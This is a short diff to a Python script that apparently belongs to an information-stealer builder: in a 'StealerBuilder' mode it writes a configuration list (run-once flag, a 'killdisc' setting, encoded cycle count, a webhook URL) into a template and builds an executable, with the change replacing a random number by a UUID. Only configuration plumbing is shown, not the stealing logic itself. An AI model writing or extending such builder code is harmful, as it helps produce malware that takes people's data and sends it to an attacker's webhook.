@@ -17,7 +17,7 @@
 # OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF OR IN
 # CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 
-import os, sys, ast, json, time, random, base64, subprocess, requests, shutil
+import os, sys, ast, json, time, random, base64, subprocess, requests, shutil, uuid
 from itertools import cycle
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor
@@ -1406,7 +1406,7 @@ elif mode == "StealerBuilder":
                 lines = f.readlines()
             os.remove("template.py")
             with open(pyname, "w") as f:
-                list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), random.randint(1000,9999)]
+                list_string = [runonce, killdisc, base64.b64encode(str(cycles).encode()).decode(), webhook.decode(), str(uuid.uuid4())]
                 lines.insert(11, f"a = {str(list_string)}")
                 f.write("".join(lines))
             print("Building EXE, Please wait...")
